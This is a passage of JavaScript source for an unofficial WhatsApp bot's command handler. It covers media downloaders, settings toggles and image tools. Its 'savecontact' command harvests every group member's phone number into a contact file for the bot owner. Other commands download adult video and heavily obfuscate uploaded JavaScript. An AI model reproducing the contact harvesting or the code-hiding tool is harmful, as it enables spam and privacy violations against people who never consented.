    const value = q.toLowerCase();
    if (value === 'true') {
        db.data.settings[botNumber].safesearch = true;
        newReply("SafeSearch has been enabled");
    } else if (value === 'false') {
        db.data.settings[botNumber].safesearch = false;
        newReply("SafeSearch has been disabled");
    } else {
        newReply("Invalid value! Send true or false");
    }
}
break
//==================================================//
case 'autodownload':
case 'autodl': {
    if (!isCreator) return newReply(mess.owner);
    if (!q) return newReply(`Send command: ${global.xprefix + command} true/false`);

    const value = q.toLowerCase();
    if (value === 'true') {
        db.data.settings[botNumber].autodownload = true;
        newReply("Auto-download has been enabled");
    } else if (value === 'false') {
        db.data.settings[botNumber].autodownload = false;
        newReply("Auto-download has been disabled");
    } else {
        newReply("Invalid value! Send true or false");
    }
}
break
//==================================================//
case 'autoblock': {
    if (!isCreator) return newReply(mess.owner);
    if (!q) return newReply(`Send command: ${global.xprefix + command} true/false`);

    const value = q.toLowerCase();
    if (value === 'true') {
        db.data.settings[botNumber].autoblocknum = true;
        newReply("Auto-block has been enabled");
    } else if (value === 'false') {
        db.data.settings[botNumber].autoblocknum = false;
        newReply("Auto-block has been disabled");
    } else {
        newReply("Invalid value! Send true or false");
    }
}
break
//==================================================//
case 'onlygroup':
case 'onlygc': {
    if (!isCreator) return newReply(mess.owner);
    if (!q) return newReply(`Send command: ${global.xprefix + command} true/false`);

    const value = q.toLowerCase();
    if (value === 'true') {
        db.data.settings[botNumber].onlygc = true;
        newReply("Group-only mode has been enabled");
    } else if (value === 'false') {
        db.data.settings[botNumber].onlygc = false;
        newReply("Group-only mode has been disabled");
    } else {
        newReply("Invalid value! Send true or false");
    }
}
break
//==================================================//
case 'onlyprivatechat':
case 'onlypc': {
    if (!isCreator) return newReply(mess.owner);
    if (!q) return newReply(`Send command: ${global.xprefix + command} true/false`);

    const value = q.toLowerCase();
    if (value === 'true') {
        db.data.settings[botNumber].onlypc = true;
        newReply("Private-chat-only mode has been enabled");
    } else if (value === 'false') {
        db.data.settings[botNumber].onlypc = false;
        newReply("Private-chat-only mode has been disabled");
    } else {
        newReply("Invalid value! Send true or false");
    }
}
break

//=====================================//
case 'setautoblock': {
    if (!isCreator) return newReply(mess.owner);
    if (!text) return newReply(`Send command: ${global.xprefix + command} <number>`);
    
    global.autoblocknumber = text;
    newReply(`Auto-block number has been set to ${text}`);
}
break;

case 'setantiforeign': {
    if (!isCreator) return newReply(mess.owner);
    if (!text) return newReply(`Send command: ${global.xprefix + command} <number>`);
    
    global.antiforeignnumber = text;
    newReply(`Anti-foreign number has been set to ${text}`);
}
break
//==================================================//

//==================================================//
  case 'block': 
case 'ban': {
    if (!isCreator) return newReply(mess.owner);

    const userJid = m.mentionedJid?.[0] 
        || m.quoted?.sender 
        || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!userJid) return newReply("Please mention a user or reply to their message to block.");

    try {
        await dave.updateBlockStatus([userJid], 'block'); // <-- note the array
        newReply("User has been blocked successfully.");
    } catch (error) {
        console.error("Block error:", error);
        newReply("Failed to block user. They may already be blocked or the ID is invalid.");
    }
}
break

case 'unblock': 
case 'unban': {
    if (!isCreator) return newReply(mess.owner);

    const userJid = m.mentionedJid?.[0] 
        || m.quoted?.sender 
        || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!userJid) return newReply("Please mention a user or reply to their message to unblock.");

    try {
        await dave.updateBlockStatus([userJid], 'unblock'); // <-- note the array
        newReply("User has been unblocked successfully.");
    } catch (error) {
        console.error("Unblock error:", error);
        newReply("Failed to unblock user. They may not be blocked or the ID is invalid.");
    }
}
break
//==================================================//
case "tohd":
case "hd":
case "remini": {
    let foto;
    try {
        if (!qmsg || !/image/.test(mime)) {
            return dave.sendMessage(m.chat, { 
                text: `Please send or reply to an image with this command.\nExample: ${prefix + command}` 
            }, { quoted: m });
        }

        const processingMsg = await m.reply("🔄 Processing your image... This may take a moment");
        foto = await dave.downloadAndSaveMediaMessage(qmsg);
        await processingMsg.edit("📡 Enhancing image quality...");

        const fileBuffer = await fs.promises.readFile(foto);
        const result = await remini(fileBuffer, "enhance");

        if (!result || result.length === 0) {
            throw new Error("Enhancement failed - no result returned");
        }

        await processingMsg.edit("✅ Sending enhanced image...");
        await dave.sendMessage(m.chat, {
            image: result,
            caption: "🖼️ Image enhanced successfully"
        }, { quoted: m });

        if (fs.existsSync(foto)) await fs.promises.unlink(foto);
        await processingMsg.delete();

    } catch (err) {
        console.error("Remini Error:", err);
        if (foto && fs.existsSync(foto)) await fs.promises.unlink(foto).catch(() => {});
        
        let errorMessage = "Failed to enhance image";
        if (err.message.includes("timeout")) errorMessage = "⏰ Processing timed out. Try a smaller image";
        else if (err.message.includes("size") || err.message.includes("large")) errorMessage = "📏 Image too large. Try a smaller image";
        else if (err.message.includes("network")) errorMessage = "🌐 Network error. Try again later";
        else if (err.message.includes("API") || err.message.includes("service")) errorMessage = "🔧 Enhancement service temporarily unavailable";

        dave.sendMessage(m.chat, { text: `${errorMessage}\n\nError: ${err.message}` }, { quoted: m });
    }
}
break
//==================================================//
   case "capcut": {
    if (!text) return dave.sendMessage(m.chat, { text: `Example: ${prefix + command} <link>` }, { quoted: m });

    // Relaxed link validation
    if (!text.includes("capcut.com")) return dave.sendMessage(m.chat, { text: "Invalid CapCut link." }, { quoted: m });

    try {
        const apiUrl = `${global.webapi}/api/download/capcut?url=${encodeURIComponent(text)}&apikey=${global.restapi}`;
        const res = await fetchJson(apiUrl);

        if (!res?.status || !res?.result?.videoUrl) {
            return dave.sendMessage(m.chat, { text: "Error! No result found or link not supported." }, { quoted: m });
        }

        await dave.sendMessage(m.chat, {
            video: { url: res.result.videoUrl },
            mimetype: "video/mp4",
            caption: "CapCut Downloader ✅"
        }, { quoted: m });
    } catch (err) {
        console.error("CapCut Download Error:", err);
        dave.sendMessage(m.chat, { text: "An error occurred while processing your request." }, { quoted: m });
    }
}
break
//==================================================//
  case "tourl":
case "tourl2": {
    // Make sure the user replied to a message
    if (!m.quoted) {
        return dave.sendMessage(
            m.chat,
            { text: "Please reply to an image, video, or audio message." },
            { quoted: m }
        );
    }

    // Check MIME type of quoted message
    const mimeType = m.quoted.mimetype || '';
    if (!/image|video|audio/.test(mimeType)) {
        return dave.sendMessage(
            m.chat,
            { text: "Example: reply with an image, video, or audio." },
            { quoted: m }
        );
    }

    async function uploadToCatbox(buffer) {
        try {
            // Get file extension with fallback
            const fileType = await fromBuffer(buffer);
            const ext = fileType?.ext || mimeType.split('/')[1] || 'bin';

            let form = new FormData();
            form.append("fileToUpload", buffer, `file.${ext}`);
            form.append("reqtype", "fileupload");

            let res = await fetch("https://catbox.moe/user/api.php", {
                method: "POST",
                body: form,
            });

            if (!res.ok) {
                throw new Error(`HTTP ${res.status}: ${res.statusText}`);
            }

            return await res.text();
        } catch (error) {
            console.error("Upload function error:", error);
            throw error;
        }
    }

    try {
        // Download the media from the quoted message
        const media = await m.quoted.download();
        
        // Optional: Add size check
        if (media.length > 50 * 1024 * 1024) { // 50MB limit
            return dave.sendMessage(
                m.chat,
                { text: "File is too large (max 50MB)." },
                { quoted: m }
            );
        }

        const url = await uploadToCatbox(media);

        await dave.sendMessage(
            m.chat,
            { text: `Upload Successful\nURL: ${url}` },
            { quoted: m }
        );
    } catch (err) {
        console.error("Tourl Error:", err);
        await dave.sendMessage(
            m.chat,
            { text: "Failed to process the media. Please try again." },
            { quoted: m }
        );
    }
}
break;
//==================================================//
case "terabox": {
    if (!text) return m.reply(example("Provide a Terabox link"));

    // Relaxed link validation
    if (!text.includes("terabox.com")) return m.reply("Invalid Terabox link format");

    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/download/terabox?url=${encodeURIComponent(text)}`;
        const res = await fetchJson(apiUrl);

        if (!res?.status || !res?.result) {
            return m.reply("Error! File not found or link is restricted.");
        }

        await dave.sendMessage(
            m.chat,
            {
                document: { url: res.result },
                mimetype: "application/zip",
                fileName: "Terabox.zip",
                caption: "Terabox Downloader ✅"
            },
            { quoted: m }
        );
    } catch (err) {
        console.error("Terabox Download Error:", err);
        return m.reply("Error fetching the file. The link may not be supported or the server is down.");
    }
}
break
//==================================================//
case "googledrive":
case "gdrive": {
    if (!text) return m.reply(example("Provide a Google Drive link"));
    
    // Basic validation
    if (!text.includes("drive.google.com")) return m.reply("Invalid link format");

    try {
        const apiUrl = `${global.webapi}/api/download/gdrive?url=${encodeURIComponent(text)}&apikey=${global.restapi}`;
        const res = await fetchJson(apiUrl);

        if (!res?.status || !res?.result?.downloadUrl) {
            return m.reply("Error! File not found or link is restricted.");
        }

        await dave.sendMessage(
            m.chat,
            {
                document: { url: res.result.downloadUrl },
                mimetype: res.result.mimetype || "application/octet-stream",
                fileName: res.result.fileName || "file"
            },
            { quoted: m }
        );
    } catch (err) {
        console.error("GDrive Download Error:", err);
        return m.reply("Error fetching the file. Please check the link or try later.");
    }
}
break
//==================================================//
  case "savecontact": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return m.reply("Please provide a group ID\nExample: .savecontact 1234567890@g.us");

    try {
        // Send initial response to show the bot is working
        const processingMsg = await m.reply("🔄 Processing group contacts... Please wait");

        const groupMeta = await dave.groupMetadata(text);
        const participants = groupMeta.participants
            .filter(v => v.id.endsWith('.net') && v.id !== botNumber && v.id.split("@")[0] !== global.owner)
            .map(v => v.id);

        if (!participants.length) {
            await processingMsg.edit("❌ No contacts found in this group.");
            return;
        }

        // Update status
        await processingMsg.edit(`📊 Found ${participants.length} contacts. Creating VCF file...`);

        // Collect unique contacts
        const uniqueContacts = [...new Set(participants)];
        
        // Build VCF content
        const vcardContent = uniqueContacts.map(contact => {
            const number = contact.split("@")[0];
            return [
                "BEGIN:VCARD",
                "VERSION:3.0",
                `FN:Contact - ${number}`,
                `TEL;type=CELL;type=VOICE;waid=${number}:+${number}`,
                "END:VCARD",
                ""
            ].join("\n");
        }).join("");

        // Write files
        fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8");
        fs.writeFileSync('./library/database/contacts.json', JSON.stringify(uniqueContacts, null, 2));

        // Send the VCF file to the user
        await dave.sendMessage(m.sender, {
            document: fs.readFileSync("./library/database/contacts.vcf"),
            fileName: `contacts_${groupMeta.subject || 'group'}.vcf`,
            caption: `✅ Contacts exported successfully\n📋 Total: ${uniqueContacts.length} contacts\n👥 Group: ${groupMeta.subject || 'Unknown'}`,
            mimetype: "text/vcard",
        }, { quoted: m });

        // Clear files after sending
        fs.unlinkSync("./library/database/contacts.vcf");
        fs.writeFileSync("./library/database/contacts.json", "[]");

        await processingMsg.edit("✅ Contacts file sent to your private chat!");

    } catch (err) {
        console.error("SaveContact Error:", err);
        
        // Specific error messages
        if (err.message.includes("not found") || err.message.includes("404")) {
            m.reply("❌ Group not found. Please check the group ID.");
        } else if (err.message.includes("timeout") || err.message.includes("network")) {
            m.reply("⏰ Operation timed out. The group might be too large.");
        } else if (err.message.includes("access") || err.message.includes("permission")) {
            m.reply("🔒 Cannot access group. Make sure the bot is in that group.");
        } else {
            m.reply("❌ Error creating contacts: " + err.message);
        }
    }
}
break
//==================================================//

//==================================================//
case "emojimix": {
    if (!text) return m.reply("Please provide emojis to mix\nExample: .emojimix 😀*😍");
    if (!text.includes("*")) return m.reply("Invalid format! Use * to separate emojis\nExample: .emojimix 😀*😍");

    let [e1, e2] = text.split("*");
    
    // Validate that both emojis are provided
    if (!e1 || !e2) return m.reply("Please provide two emojis separated by *\nExample: .emojimix 😀*😍");
    
    // Validate that inputs are actually emojis (basic check)
    const emojiRegex = /[\p{Emoji}]/gu;
    if (!emojiRegex.test(e1) || !emojiRegex.test(e2)) {
        return m.reply("Please provide valid emojis only\nExample: .emojimix 😀*😍");
    }

    let apiUrl = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`;

    try {
        let stickerBuffer = await getBuffer(apiUrl);
        
        // Check if the API returned a valid image
        if (!stickerBuffer || stickerBuffer.length === 0) {
            return m.reply("These emojis cannot be mixed together. Try different combinations!");
        }
        
        await dave.sendAsSticker(m.chat, stickerBuffer, m, { 
            packname: global.packname || "RACHEL-XMD",
            author: "Emoji Mix"
        });
        
    } catch (err) {
        console.error("Emojimix Error:", err);
        
        // More specific error messages
        if (err.message.includes("404") || err.message.includes("Not Found")) {
            m.reply("These emojis cannot be combined. Try different emoji pairs!");
        } else if (err.message.includes("timeout") || err.message.includes("network")) {
            m.reply("Service temporarily unavailable. Please try again in a moment.");
        } else {
            m.reply("Failed to create emoji mix. The combination might not be supported.");
        }
    }
}
break
//==================================================//

  case "xnxx": {
    if (!text) return m.reply("Example: .xnxx step sister");

    await dave.sendMessage(m.chat, { react: { text: '🔎', key: m.key } });

    try {
        let searchResult = await fetchJson(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(text)}`);
        let results = searchResult.result || searchResult.data; // fallback if API changed

        if (!results || results.length === 0) {
            return m.reply("No results found or invalid format from API.");
        }

        let output = "";
        for (let res of results) {
            output += `Title: ${res.title || "N/A"}\nInfo: ${res.info || "N/A"}\nLink: ${res.link || "N/A"}\n\n`;
        }

        await m.reply(output);
    } catch (err) {
        console.error(err);
        m.reply("Failed to fetch results. API might be down or query is invalid.");
    }
}
break
//==================================================//
case "xnxxdl": {
    if (!text) return m.reply("Provide a valid link");
    if (!/^https?:\/\//.test(text)) return m.reply("Invalid link format");

    try {
        let res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/xnxx?url=${encodeURIComponent(text)}`);
        if (!res.status || !res.result) return m.reply("Error: Result not found");

        // safer fallback for file URLs
        let videoUrl = res.result.files.high || res.result.files.hight || res.result.files.low;
        if (!videoUrl) return m.reply("No downloadable video found");

        await dave.sendMessage(
            m.chat,
            {
                video: { url: videoUrl },
                mimetype: "video/mp4",
                caption: "XNXX Downloader"
            },
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        m.reply("Error occurred: " + err.message);
    }
}
break;


//==================================================//
 
//==================================================//

case 'listblock': {
    if (!isBot) return m.reply(mess.owner)
    let block = await dave.fetchBlocklist()
    reply(
        'List Block :\n\n' +
        `Total : ${block == undefined ? '*0* BLOCKED NUMBERS' : '*' + block.length + '* Blocked Contacts'}\n` +
        block.map(v => '💠 ' + v.replace(/@.+/, '')).join`\n`
    )
}
break

//==================================================// 
case 'fb': case 'facebook': case 'fbdl':
case 'ig': case 'instagram': case 'igdl': {
 if (!args[0]) return reply("💠 provide a facebook or Instagram link!");
 try {
 const axios = require('axios');
 const cheerio = require('cheerio');
 async function yt5sIo(url) {
 try {
 const form = new URLSearchParams();
 form.append("q", url);
 form.append("vt", "home");
 const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
 headers: {
 "Accept": "application/json",
 "X-Requested-With": "XMLHttpRequest",
 "Content-Type": "application/x-www-form-urlencoded",
 },
 });
 if (data.status !== "ok") throw new Error("provide a valid link.");
 const $ = cheerio.load(data.data); 
 if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
 const thumb = $('img').attr("src");
 let links = [];
 $('table tbody tr').each((_, el) => {
 const quality = $(el).find('.video-quality').text().trim();
 const link = $(el).find('a.download-link-fb').attr("href");
 if (quality && link) links.push({ quality, link });
 });
 if (links.length > 0) {
 return { platform: "facebook", type: "video", thumb, media: links[0].link };
 } else if (thumb) {
 return { platform: "facebook", type: "image", media: thumb };
 } else {
 throw new Error("media is invalid.");
 }
 } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
 const video = $('a[title="Download Video"]').attr("href");
 const image = $('img').attr("src");
 if (video) {
 return { platform: "instagram", type: "video", media: video };
 } else if (image) {
 return { platform: "instagram", type: "image", media: image };
 } else {
 throw new Error("Media invalid.");
 }
 } else {
 throw new Error("provide a valid url or link.");
 }
 } catch (error) {
 return { error: error.message };
 }
 }
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 let res = await yt5sIo(args[0]);
 if (res.error) {
 await dave.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 return reply(`⚠ *Error:* ${res.error}`);
 }
 if (res.type === "video") {
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await dave.sendMessage(m.chat, { video: { url: res.media }, caption: "💠 *Downloaded by RACHEL-XMD!*" }, { quoted: m });
 } else if (res.type === "image") {
 await dave.sendMessage(m.chat, {
 react: {
 text: "⏳",
 key: m.key,
 }
 });
 await dave.sendMessage(m.chat, { image: { url: res.media }, caption: "💠 *Downloaded photo by RACHEL-XMD!*" }, { quoted: m });
 }
 } catch (error) {
 console.error(error);
 await dave.sendMessage(m.chat, {
 react: {
 text: "❌",
 key: m.key,
 }
 });
 reply("failed to get media.");
 }
}
break
//==================================================//
case 'groupinfo':
case 'getgroupinfo':
case 'getinfogc': {
    if (!isPremium) return newReply(mess.premium);
    if (!text) return newReply(`Send command ${global.xprefix + command} _grouplink_`);

    let link = text.trim();
    
    // Better URL validation
    if (!link.includes('chat.whatsapp.com')) {
        return newReply('Invalid group link! Must be a WhatsApp group link.');
    }

    try {
        // Extract invite code more reliably (handle query parameters)
        let urlParts = link.split('https://chat.whatsapp.com/');
        if (urlParts.length < 2) return newReply('Cannot extract invitation code from link.');
        
        let inviteCode = urlParts[1].split('?')[0]; // Remove query parameters
        if (!inviteCode) return newReply('Cannot find valid invitation code.');

        let data = await dave.groupGetInviteInfo(inviteCode);

        let teks = `「 GROUP METADATA 」\n\n`;
        teks += `- ID            : ${data.id}\n`;
        teks += `- Name          : ${data.subject}\n`;
        teks += `- Owner         : @${data.owner.split('@')[0]}\n`;
        teks += `- Send Messages : ${data.announce ? 'Admin Only' : 'Everyone'}\n`;
        teks += `- Admin Approval: ${data.joinApprovalMode ? 'Yes' : 'No'}\n`;
        teks += `- Member Add Mode : ${data.memberAddMode ? 'Yes' : 'No'}\n`;
        teks += `- Description   :\n${data.desc || 'No description'}\n\n`;
        teks += `- Total Members : ${data.participants.length}\n\n`;
        teks += `- Top Members :\n`;

        const topParticipants = data.participants.slice(0, 15);
        const mentionIds = [data.owner];
        
        for (let participant of topParticipants) {
            teks += `- @${participant.id.split('@')[0]}\n`;
            mentionIds.push(participant.id);
        }

        if (data.participants.length > 15) {
            teks += `- ...and ${data.participants.length - 15} more members\n`;
        }

        // Send message with mentions (limit mentions to avoid issues)
        await dave.sendMessage(m.chat, {
            text: teks,
            mentions: mentionIds.slice(0, 50) // WhatsApp limit
        }, { quoted: m });

    } catch (error) {
        console.error("GroupInfo Error:", error);
        
        // More specific error messages
        if (error.message.includes('invite') || error.message.includes('invalid')) {
            newReply('Invalid group link or expired invitation.');
        } else if (error.message.includes('access') || error.message.includes('permission')) {
            newReply('Cannot access group info. The group may be private or the link expired.');
        } else {
            newReply('Failed to get group info. Please try again.');
        }
    }
}
break
//==================================================//
case 'tiktok': {
if (!text) return reply(`Use : ${prefix + command} link`)
// wait message
trashreply(mess.wait)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await dave.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
})
} else {
dave.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
setTimeout(() => {
dave.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
}, 3000)
}
}
break
//==================================================//
case 'idch': case 'cekidch': {
if (!text) return reply("channel link?")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await dave.newsletterMetadata("invite", result)
let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: teks }, 
footer: {
text: "Dave-𝗕𝗼𝘁𝘀" }, //input watermark footer
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : fkontak });
await dave.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break
//==================================================//
//================================================//
//==================================================//
case 'enc':
case 'encrypt': {
const JsConfuser = require('js-confuser')

if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
return reply('💠 Please reply to the  file to be obfuscated.');
}
const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
const quotedDocument = quotedMessage.documentMessage;
if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
return reply('💠 Please reply to the file to be obfuscated.');
}
try {
const fileName = quotedDocument.fileName;
const docBuffer = await m.quoted.download();
if (!docBuffer) {
return reply('💠 Please reply to the file to be obfuscated.');
}
await dave.sendMessage(m.chat, {
 react: { text: '🕛', key: m.key }
 });
const obfuscatedCode = await JsConfuser.obfuscate(docBuffer.toString(), {
target: "node",
preset: "high",
compact: true,
minify: true,
flatten: true,
identifierGenerator: function () {
const originalString = "素GIFTD晴DAVE晴" + "素GIFTED晴DAVE晴";
const removeUnwantedChars = (input) => input.replace(/[^a-zA-Z素GIFTED晴DAVE晴]/g, "");
const randomString = (length) => {
let result = "";
const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * characters.length));
}
return result;
};
return removeUnwantedChars(originalString) + randomString(2);
},
renameVariables: true,
renameGlobals: true,
stringEncoding: true,
stringSplitting: 0.0,
stringConcealing: true,
stringCompression: true,
duplicateLiteralsRemoval: 1.0,
shuffle: { hash: 0.0, true: 0.0 },
stack: true,
controlFlowFlattening: 1.0,
opaquePredicates: 0.9,
deadCode: 0.0,
dispatcher: true,
rgf: false,
calculator: true,
hexadecimalNumbers: true,
movedDeclarations: true,
objectExtraction: true,
globalConcealing: true,
});
await dave.sendMessage(m.chat, {
document: Buffer.from(obfuscatedCode, 'utf-8'),
mimetype: 'application/javascript',
fileName: `${fileName}`,
caption: `•Successful Encrypt
•Type: Hard Code
•@Tennormodz`,
}, { quoted: fkontak });

} catch (err) {
console.error('Error during encryption:', err);
await reply(`💠 Unexpected error occurred: ${error.message}`);
}
break;
}
//==================================================//   
        case 'ytmp4': {
  const axios = require('axios');
  const input = text?.trim();
  if (!input) return reply(`play:\n.ytmp4 https://youtu.be/xxxx,720\n\nList for results:\n- 360\n- 480\n- 720\n- 1080`);
  const [url, q = '720'] = input.split(',').map(a => a.trim());
  const validUrl = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\//.test(url);
  if (!validUrl) return reply(`❌ URL YouTube is not valid!`);
  const qualityMap = {
    "360": 360,
    "480": 480,
    "720": 720,
    "1080": 1080
  };

  if (!qualityMap[q]) {
    return reply(`❌ Quality must be valid!\nexample: 360, 720, 1080`);
  }
  const quality = qualityMap[q];
  const sendResult = async (meta) => {
    await dave.sendMessage(m.chat, {
      image: { url: meta.image },
      caption: `✅ *Title:* ${meta.title}\n📥 *Type:* MP4\n🎚️ *Quality:* ${meta.quality}p\n\nSending  file...`,
    }, { quoted: m });
    await dave.sendMessage(m.chat, {
      document: { url: meta.downloadUrl },
      mimetype: 'video/mp4',
      fileName: `${meta.title}.mp4`
    }, { quoted: m });
  };

  try {
    const { data: start } = await axios.get(
      `https://p.oceansaver.in/ajax/download.php?button=1&start=1&end=1&format=${quality}&iframe_source=https://allinonetools.com/&url=${encodeURIComponent(url)}`,
      {
        timeout: 30000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
      }
    );
    if (!start.progress_url) return m.reply(`❌ failed to start progress`);
    let progressUrl = start.progress_url;
    let meta = {
      image: start.info?.image || "https://telegra.ph/file/fd0028db8c3fc25d85726.jpg",
      title: start.info?.title || "Unknown Title",
      downloadUrl: "",
      quality: q,
      type: "mp4"
    };
    let polling, attempts = 0;
    const maxTry = 40;
    reply('⏳ processing video...');
    do {
      if (attempts >= maxTry) return reply(`❌ Timeout process!`);
      await new Promise(r => setTimeout(r, 3000));
      try {
        const { data } = await axios.get(progressUrl, {
          timeout: 15000,
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
          }
        });
        polling = data;
        if (polling.progress < 100) console.log(`Progress: ${polling.progress}%`);
      } catch (e) {
        console.log(`Polling ${attempts + 1} gagal`);
      }
      attempts++;
    } while (!polling?.download_url);
    if (!polling.download_url) return reply(`❌ failed to get download from the link`);
    meta.downloadUrl = polling.download_url;
    return await sendResult(meta);
  } catch (e) {
    console.error(e);
    return reply(`❌ error has occurred: ${e.message || 'err'}`);
  }
}
break
//==================================================//
        case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return reply(`Example : ${prefix+command} Trash corr`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
dave.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//━━━━━━━━━━━━━━━━━━━━━━━━//
default:
if (budy.startsWith('=>')) {
if (!daveshown) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
